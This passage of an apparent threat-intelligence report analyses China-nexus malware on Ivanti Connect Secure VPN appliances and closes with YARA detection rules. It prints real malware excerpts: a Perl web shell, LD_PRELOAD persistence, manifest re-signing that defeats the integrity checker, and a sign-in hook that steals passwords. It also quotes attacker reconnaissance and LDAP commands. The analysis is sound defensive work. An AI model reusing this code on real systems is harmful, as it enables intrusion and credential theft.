<p><span style="vertical-align:baseline">Unlike the first method described in this blog post for system upgrade persistence, SPAWNANT does not block the upgrade process. It survives the upgrade process by ensuring itself and its components are migrated to the new upgrade partition (mounted on </span><code style="vertical-align:baseline">/tmp/data/</code><span style="vertical-align:baseline"> during a legitimate system upgrade process).</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>cp /lib/libupgrade.so /tmp/data/root/lib
cp /home/lib/libsocks5.so /tmp/data/root/home/lib
cp /home/lib/libsshd.so /tmp/data/root/home/lib</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">SPAWNANT sets the </span><code style="vertical-align:baseline">LD_PRELOAD</code><span style="vertical-align:baseline"> environment variable to itself (</span><code style="vertical-align:baseline">libupgrade.so</code><span style="vertical-align:baseline">) within </span><code style="vertical-align:baseline">DSUpgrade.pm</code><span style="vertical-align:baseline"> on the upgrade partition. The modification tells the dynamic linker to load </span><code style="vertical-align:baseline">libupgrade.so</code><span style="vertical-align:baseline"> and use SPAWNANT’s malicious exported </span><code style="vertical-align:baseline">snprintf</code><span style="vertical-align:baseline"> function before other libraries.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>ENV{“LD_PRELOAD”} = “libupgrade.so”</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Next, SPAWNANT establishes an additional method of backdoor access by writing a web shell into </span><code style="vertical-align:baseline">compcheckresult.cgi</code><span style="vertical-align:baseline"> on the upgrade partition. The web shell uses </span><code style="vertical-align:baseline">system()</code><span style="vertical-align:baseline"> to execute the value passed to a hard-coded query parameter. The following provides the relevant excerpt of the inserted web shell.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>if(CGI::param(&quot;&lt;redacted&gt;&quot;)) {
	print &quot;Cache-Control: no-cache&quot;; 
	print &quot;Content-type: text/html&quot;; 
	my $a=CGI::param(&quot;&lt;redacted&gt;&quot;); 
	system(&quot;$a&quot;);
}</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Throughout this entire process, SPAWNANT is careful to circumvent the ICT by recalculating the SHA256 hash for any maliciously modified files. Once the appropriate modifications are complete, SPAWNANT generates a new RSA key pair to sign the modified manifest.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/home/bin/openssl genrsa -out private.pem 2048
/home/bin/openssl rsa -in private.pem -out manifest.2 
-outform PEM -pubout
/home/bin/openssl dgst -sha512 -sign private.pem -out 
manifest.1 /tmp/data/root/home/etc/manifest/manifest
mv manifest.1 manifest.2 /tmp/data/root/home/etc/manifest/
rm -f private.pem'</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2><span style="vertical-align:baseline">Post Exploitation</span></h2>
<h3><span style="vertical-align:baseline">Tunnelers</span></h3>
<p><span style="vertical-align:baseline">After establishing an initial foothold on an appliance, Mandiant observed a number of different tunnelers, including the use of publicly-available and open-source tunnelers, designed to facilitate communication channels between the compromised appliance and the threat actor’s command and control infrastructure. These tunnelers allowed the attacker to bypass network security controls and may enable lateral movement further into a victim environment.</span></p>
<h4><span style="vertical-align:baseline">SPAWNMOLE </span></h4>
<p><span style="vertical-align:baseline">Originally reported in </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement"><span style="text-decoration:underline;vertical-align:baseline">Cutting Edge, Part 4</span></a><span style="vertical-align:baseline">, SPAWNMOLE is a tunneler injected into the web process. It hijacks the </span><code style="vertical-align:baseline">accept</code><span style="vertical-align:baseline"> function in the </span><code style="vertical-align:baseline">web</code><span style="vertical-align:baseline"> process to monitor traffic and filter out malicious traffic originating from the attacker. SPAWNMOLE is activated when it detects a specific series of magic bytes. Otherwise, the remainder of the benign traffic is passed unmodified to the legitimate web server functions. The malicious traffic is tunneled to a host provided by an attacker in the buffer.</span></p>
<h3><span style="vertical-align:baseline">LDAP Queries</span></h3>
<p><span style="vertical-align:baseline">The threat actor used several tools to perform internal network reconnaissance. This includes using built-in tools included on the ICS appliance such as </span><code style="vertical-align:baseline">nmap</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">dig</code><span style="vertical-align:baseline"> to determine what can be accessed from the appliance. The threat actor has also been observed using the LDAP service account, if configured, from the ICS appliance to perform LDAP queries. The LDAP service account was also observed being used to move laterally within the network, including Active Directory servers, through SMB or RDP. The observed attacker commands were prefaced by the following lines:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>#!/bin/sh 
export LD_LIBRARY_PATH=/home/lib/;
export DSINSTALL=/home;
export PATH=/usr/local/bin:/bin:/usr/bin:/sbin:/home/bin:/home/venv3/bin/;
dmesg -c;
&lt;commands&gt;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The following reconnaissance commands were seen executed by the threat actor prior to LDAP queries:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>dig @&lt;IP ADDRESS&gt; &lt;VICTIM DOMAIN&gt; A
nmap -Pn -sT -p 80,443,445 &lt;IP ADDRESS&gt; --open</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">LDAP queries were executed using</span><code style="vertical-align:baseline"> /tmp/lmdbcerr</code><span style="vertical-align:baseline">, with output directed to randomly named files in the</span><code style="vertical-align:baseline"> /tmp</code><span style="vertical-align:baseline"> directory. Password, host, and query were passed as command line arguments.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>/tmp/lmdbcerr [redacted] -u &#39;CN=[redacted],CN=Managed Service 
Accounts,DC=[redacted]&#39; -p &#39;[redacted]&#39; -h &lt;IP ADDRESS&gt; --tls --dn 
DC=[redacted] -o /tmp/&lt;RANDOM STRING&gt;

/tmp/lmdbcerr [redacted] -u &#39;dc=[redacted]&#39; -p &#39;&lt;PASSWORD&gt;&#39; -h 
api-[redacted].duosecurity.com --tls --dn dc=[redacted] -o 
/tmp/&lt;RANDOM STRING&gt;

/tmp/lmdbcerr [redacted] -u &#39;dc=[redacted]&#39; -p &#39;&lt;PASSWORD&gt;&#39; -h 
api-[redacted].duosecurity.com --tls --filter &#39;(cn=*)&#39; --dn dc=[redacted] 
-o /tmp/&lt;RANDOM STRING&gt;

/tmp/lmdbcerr [redacted] -u &#39;dc=[redacted]&#39; -p &#39;&lt;PASSWORD&gt;&#39; 
-h api-[redacted].duosecurity.com --tls --filter &#39;(distinguishedName=*)&#39; 
--dn dc=[redacted] -o /tmp/&lt;RANDOM STRING&gt;

/tmp/lmdbcerr [redacted] -u &#39;dc=[redacted]&#39; -p &#39;&lt;PASSWORD&gt;&#39; 
-h api-[redacted].duosecurity.com --tls --filter &#39;(dn=*)&#39; --dn dc=[redacted] 
-o /tmp/&lt;RANDOM STRING&gt;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h3><span style="vertical-align:baseline">Appliance Cache Database Theft</span></h3>
<p><span style="vertical-align:baseline">Mandiant has observed the threat actor archiving the database cache on a compromised appliance and staging the archived data in a directory served by the public-facing web server to enable exfiltration of the database. The database cache may contain information associated with VPN sessions, session cookies, API keys, certificates, and credential material. </span></p>
<p><span style="vertical-align:baseline">The threat actor archives the contents of </span><code style="vertical-align:baseline">/runtime/mtmp/lmdb</code><span style="vertical-align:baseline">. The resulting tar archive is then renamed and masquerades itself as a CSS file located within </span><code style="vertical-align:baseline">/home/webserver/htdocs/dana-na/css/</code><span style="vertical-align:baseline">. </span></p>
<p><span style="vertical-align:baseline">Ivanti has previously published </span><a href="https://forums.ivanti.com/s/article/Recovery-Steps?language=en_US" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">guidance</span></a><span style="vertical-align:baseline"> on remediating the risk that may result from the database cache dump. This includes resetting local account credentials, resetting API keys, and revoking certificates.</span></p>
<h3><span style="vertical-align:baseline">Credential Harvesting</span></h3>
<p><span style="vertical-align:baseline">Mandiant has observed the threat actor deploying a Python script, tracked as </span><a href="https://www.virustotal.com/gui/collection/malware--93fbcf96-3808-5b82-af22-ee77fa926a15" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">DRYHOOK</span></a><span style="vertical-align:baseline">, to steal credentials. The malware is designed to modify a system component named </span><code style="vertical-align:baseline">DSAuth.pm</code><span style="vertical-align:baseline"> that belongs to the Ivanti Connect Secure environment in order to harvest successful authentications.</span></p>
<p><span style="vertical-align:baseline">Upon execution, the malicious Python script opens </span><code style="vertical-align:baseline">/home/perl/DSAuth.pm</code><span style="vertical-align:baseline"> and reads its content in a buffer. Next, the malware uses regular expressions to find and replace the following lines of code:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>*setPrompt
*runSignin = *DSAuthc::RealmSignin_runSignin;
*runSigninEBSL</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The </span><code style="vertical-align:baseline">*setPrompt</code><span style="vertical-align:baseline"> value above is replaced with the following Perl code:</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># *setPrompt
$ds_g="";
sub setPrompt{
    eval{
        my $res=@_[1]."=".@_[2]."\n";
        $ds_g .= $res;
    };
    return DSAuthc::RealmSignin_setPrompt(@_);
}
$ds_e="";</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The injected </span><code style="vertical-align:baseline">setPrompt</code><span style="vertical-align:baseline"> routine captures the second and the third parameter, combines them into the format </span><code style="vertical-align:baseline">&lt;param2&gt;=&lt;param3&gt;</code><span style="vertical-align:baseline"> and then assigns the produced string to a global variable named </span><code style="vertical-align:baseline">$ds_g</code><span style="vertical-align:baseline">. The next replacement, shown as follows, reveals that the second parameter is a username, and the third parameter is the password of a user trying to authenticate.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># *runSignin = *DSAuthc::RealmSignin_runSignin;
$ds_g1=&quot;&quot;;
sub encode_base64 ($;$)
{
    my $res = &quot;&quot;;
    my $eol = $_[1];
    $eol = &quot;\n&quot; unless defined $eol;
    pos($_[0]) = 0;                          # ensure start at the beginning

    $res = join &#39;&#39;, map( pack(&#39;u&#39;,$_)=~ /^.(\S*)/, ($_[0]=~/(.{1,45})/gs));

    $res =~ tr|` -_|AA-Za-z0-9+/|;               # `# help emacs
    # fix padding at the end
    my $padding = (3 - length($_[0]) % 3) % 3;
    $res =~ s/.{$padding}$/&#39;=&#39; x $padding/e if $padding;
    return $res;
}
sub runSignin{
    my $res=DSAuthc::RealmSignin_runSignin(@_);
    if(@_[1]-&gt;{status} != $DSAuth::Reject &amp;&amp; 
        @_[1]-&gt;{status} != $DSAuth::Restart){
        if($ds_g ne &quot;&quot;){
            CORE::open(FH,&quot;&gt;&gt;/tmp/cmdmmap.kuwMW&quot;);
            my $dd=RC4(&quot;redacted&quot;,$ds_g);
            print FH encode_base64($dd).&quot;\n&quot;;
            CORE::close(FH);
            $ds_g = &quot;&quot;; 
        }   
    }
    elsif(@_[1]-&gt;{status} == $DSAuth::Reject || 
            @_[1]-&gt;{status} == $DSAuth::Restart){
        $ds_g = &quot;&quot;; 
    }
    return $res;
}
$ds_e1=&quot;&quot;;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">The code above contains two subroutines named </span><code style="vertical-align:baseline">encode_base64</code><span style="vertical-align:baseline"> and </span><code style="vertical-align:baseline">runSignin</code><span style="vertical-align:baseline">. The former takes a string and Base64 encodes it, while the latter intercepts the sign-in process and upon a successful attempt serializes the saved credentials into the global variable </span><code style="vertical-align:baseline">$ds_g</code><span style="vertical-align:baseline"> username and password in a file named </span><code style="vertical-align:baseline">cmdmmap.kuwMW</code><span style="vertical-align:baseline"> under the </span><code style="vertical-align:baseline">/tmp</code><span style="vertical-align:baseline"> directory. The </span><code style="vertical-align:baseline">&lt;username&gt;=&lt;password&gt;</code><span style="vertical-align:baseline"> string is first RC4 encrypted with a hard-coded key and then Base64 encoded with the </span><code style="vertical-align:baseline">encode_base64</code><span style="vertical-align:baseline"> routine before being saved into the </span><code style="vertical-align:baseline">cmdmmap.kuwMW</code><span style="vertical-align:baseline"> file.</span></p>
<p><span style="vertical-align:baseline">The last code replacement is shown as follows, and it is the same code as above, but it targets a different sign-in scheme that is named EBSL in the code.</span></p></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code># *runSigninEBSL
$ds_g2=&quot;&quot;;
sub runSigninEBSL{
    my $res=DSAuthc::RealmSignin_runSigninEBSL(@_);
    if(@_[1]-&gt;{status} != $DSAuth::Reject &amp;&amp; 
        @_[1]-&gt;{status} != $DSAuth::Restart){
        if($ds_g ne &quot;&quot;){
            use Crypt::RC4;
            CORE::open(FH,&quot;&gt;&gt;/tmp/cmdmmap.kuwMW&quot;);
            my $dd=RC4(&quot;redacted&quot;,$ds_g);
            print FH encode_base64($dd).&quot;\n&quot;;
            CORE::close(FH);
            $ds_g = &quot;&quot;; 
        }   
    }
    elsif(@_[1]-&gt;{status} == $DSAuth::Reject || 
            @_[1]-&gt;{status} == $DSAuth::Restart){
        $ds_g = &quot;&quot;; 
    }
    return $res;
}
$ds_e2=&quot;&quot;;</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">After the changes are made, the malware attempts to write the modified content back to the </span><code style="vertical-align:baseline">DSAuth.pm</code><span style="vertical-align:baseline"> file, and if unsuccessful, it will remount the file system as readwrite, write the file, and then mount the file system as readonly again. Finally, all instances of the </span><code style="vertical-align:baseline">cgi-server </code><span style="vertical-align:baseline">process are killed in order for the modified </span><code style="vertical-align:baseline">DSAuth.pm</code><span style="vertical-align:baseline"> to be activated.</span></p>
<h2><span style="vertical-align:baseline">Attribution</span></h2>
<p><span style="vertical-align:baseline">Mandiant has previously only observed the deployment of the SPAWN ecosystem of malware on Ivanti Connect Secure appliances by UNC5337. UNC5337 is a China-nexus cluster of espionage activity including operations that compromised Ivanti Connect Secure VPN appliances as early as Jan. 2024 and most recently as Dec. 2024. This included the Jan 2024 exploitation of CVE-2023-46805 (authentication bypass) and CVE-2024-21887 (command injection) to compromise Ivanti Connect Secure appliances. UNC5337 then leveraged multiple custom malware families including the SPAWNSNAIL passive backdoor, SPAWNMOLE tunneler, SPAWNANT installer, and SPAWNSLOTH log tampering utility. Mandiant suspects with medium confidence that UNC5337 is part of UNC5221.</span></p>
<p><span style="vertical-align:baseline">UNC5221 is a suspected China-nexus espionage actor that exploited vulnerabilities CVE-2023-46805 and CVE-2024-21887, which impacted Ivanti Connect Secure VPN and Ivanti Policy Security appliances as early as December 2023. Following the successful exploitation of CVE-2023-46805 (authentication bypass) and CVE-2024-21887 (command injection), UNC5221 leveraged multiple custom malware families, including the ZIPLINE passive backdoor, THINSPOOL dropper, LIGHTWIRE web shell, and WARPWIRE credential harvester. UNC5221 was also observed leveraging the PySoxy tunneler and BusyBox to enable post-exploitation activity. Additionally, Mandiant previously observed UNC5221 leveraging a likely </span><a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks"><span style="text-decoration:underline;vertical-align:baseline">ORB network</span></a><span style="vertical-align:baseline"> of compromised Cyberoam appliances to enable intrusion operations. </span></p>
<h2><span style="vertical-align:baseline">Conclusion</span></h2>
<p><span style="vertical-align:baseline">Following the Jan. 10, 2024, disclosure of CVE-2023-46805 and CVE-2024-21887, Mandiant observed widespread exploitation by UNC5221 targeting Ivanti Connect Secure appliances across a wide range of countries and verticals. Mandiant assesses that defenders should be prepared for widespread, opportunistic exploitation, likely targeting credentials and the deployment of web shells to provide future access. Additionally, if proof-of-concept exploits for CVE-2025-0282 are created and released, Mandiant assesses it is likely additional threat actors may attempt targeting Ivanti Connect Secure appliances.</span></p>
<h2><span style="vertical-align:baseline">Recommendations</span></h2>
<p><a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283?language=en_US" rel="noopener" target="_blank"><span style="text-decoration:underline;vertical-align:baseline">Ivanti recommends</span></a><span style="vertical-align:baseline"> utilizing their external and internal Integrity Checker Tool (“ICT”) and to contact Ivanti Support if suspicious activity is identified. While Mandiant has observed threat actor attempts to evade detection by the ICT, the following screenshots provide examples of how a successful scan should appear versus an unsuccessful scan on a device that has been compromised. Note the number of steps reported by the output.</span></p></span></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig1.max-1400x1400.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>External ICT Scan - Successful</p></span></div></section></div></section><section class="QzPuud"><div><section><figure class="NEBdNd"><section class="PBkdHd DhGbH" jscontroller="SCGBie" jsaction="rcuQ6b:npT2md"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><section class="glue-modal glue-modal--dark QHdDac" role="dialog" aria-modal="true"><img class="JcsBte mZzdH ZOnyjc" src="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png" alt="https://storage.googleapis.com/gweb-cloudblog-publish/images/ivanti-new-zero-day-fig2.max-1300x1300.png" jsname='P3Vluc' jsaction="click:HTIlC" loading="lazy"/><button class="glue-modal__close-btn" tabindex="0" aria-label="Close this modal"></button></section></section></figure><div class="nRhiJb-cHYyed nRhiJb-DbgRPb-R6PoUb-ma6Yeb ZpqjUe"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p>External ICT Scan - Unsuccessful (limited number of steps performed)</p></span></div></section></div></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><p><span style="vertical-align:baseline">Ivanti also notes that the ICT is a snapshot of the current state of the appliance and cannot necessarily detect threat actor activity if they have returned the appliance to a clean state. The ICT does not scan for malware or other Indicators of Compromise. Ivanti recommends that customers should run the ICT in conjunction with other security monitoring tools which have detected post-exploitation activity. </span></p>
<p><span style="vertical-align:baseline">If the ICT result shows signs of compromise, Ivanti recommends a </span><a href="https://forums.ivanti.com/s/article/Recovery-Steps" rel="noopener" target="_blank"><span style="vertical-align:baseline">factory reset</span></a><span style="vertical-align:baseline"> on the appliance to ensure any malware is removed and to then place the appliance back into production using version 22.7R2.5. </span></p>
<h2><span style="vertical-align:baseline">Acknowledgement</span></h2>
<p><span style="vertical-align:baseline">We would like to thank the team at Ivanti for their continued partnership and support in this investigation. Additionally, this analysis would not have been possible without the assistance from analysts across Google Threat Intelligence Group and Mandiant’s FLARE. </span></p>

</div></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><h2>YARA Rules</h2></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>rule M_APT_Installer_SPAWNSNAIL_1
{ 
    meta: 
        author = "Mandiant" 
        description = "Detects SPAWNSNAIL. SPAWNSNAIL is an SSH 
backdoor targeting Ivanti devices. It has an ability to inject a specified 
binary to other process, running local SSH backdoor when injected to 
dsmdm process, as well as injecting additional malware to dslogserver" 
        md5 = "e7d24813535f74187db31d4114f607a1"
  
    strings: 
        $priv = "PRIVATE KEY-----" ascii fullword
        
        $key1 = "%d/id_ed25519" ascii fullword
        $key2 = "%d/id_ecdsa" ascii fullword
        $key3 = "%d/id_rsa" ascii fullword
        
        $sl1 = "[selinux] enforce" ascii fullword
        $sl2 = "DSVersion::getReleaseStr()" ascii fullword
        
        $ssh1 = "ssh_set_server_callbacks" ascii fullword
        $ssh2 = "ssh_handle_key_exchange" ascii fullword
        $ssh3 = "ssh_add_set_channel_callbacks" ascii fullword
        $ssh4 = "ssh_channel_close" ascii fullword
    
    condition: 
        uint32(0) == 0x464c457f and $priv and any of ($key*) 
and any of ($sl*) and any of ($ssh*)
}</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>rule M_APT_Installer_SPAWNANT_1
{ 
    meta: 
        author = "Mandiant" 
        description = "Detects SPAWNANT. SPAWNANT is an 
Installer targeting Ivanti devices. Its purpose is to persistently 
install other malware from the SPAWN family (SPAWNSNAIL, 
SPAWNMOLE) as well as drop additional webshells on the box." 
  
    strings: 
        $s1 = "dspkginstall" ascii fullword
        $s2 = "vsnprintf" ascii fullword
        $s3 = "bom_files" ascii fullword
        $s4 = "do-install" ascii
        $s5 = "ld.so.preload" ascii
        $s6 = "LD_PRELOAD" ascii
        $s7 = "scanner.py" ascii
        
    condition: 
        uint32(0) == 0x464c457f and 5 of ($s*)
}</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>rule M_Tunneler_SPAWNMOLE_3
{
    meta:
        author = &quot;Mandiant&quot;
        description = &quot;Hunting rule looking for strings and code 
identified in SPAWNMOLE samples&quot;
        md5 = &quot;a638fd203ddb540d0484d8e00490df06&quot;
    strings:
        $str1 = &quot;/proc/self/exe&quot;
        $str2 = &quot;/proc/%d/maps&quot;
        $str3 = &quot;=&gt; encrypt buf&quot;
        $str4 = &quot;=&gt; decrypt buf&quot;
        $str5 = &quot;%s    &lt;malformed&gt;&quot;
        $comparison1 = { 3C 16 74 [1] 0F B6 [2] 3C 03 74 [1] 0F B6 [2] 3C 01 0F 85 }
        $comparison2 = { 81 [2] E2 E3 49 FB 0F 85 [4] 81 [2] 61 83 C3 1B 0F 85}
        $code1 = { 8D 55 B8 8B 45 F0 01 D0 0F B6 10 8B 4D F0 8B 45 0C 01 C8 0F 
B6 00 31 C2 8D 4D B8 8B 45 F0 01 C8 88 10 83 45 F0 01 83 7D F0 2F 7E D4 }
        $code2 = { 81 7D E8 E2 E3 49 FB 0F 85 CD 00 00 00 81 7D E4 61 83 C3 1B }
    condition:
        uint32(0) == 0x464c457f and
        (all of ($s*)) and
        (1 of ($comparison*)) and
        (1 of ($code*))
}</code></pre></span></section><section class="Wy08Ac nRhiJb-qJTHM-OWXEXe-hJDwNd nRhiJb-DbgRPb-II5mzb-cGMI2b"><span class="dQQu7c" jsaction="rcuQ6b:npT2md" jscontroller="YSybTb" data-track-type="" soy-skip ssk='5:kbe95'><pre><code>rule M_Dropper_PHASEJAM_1 {

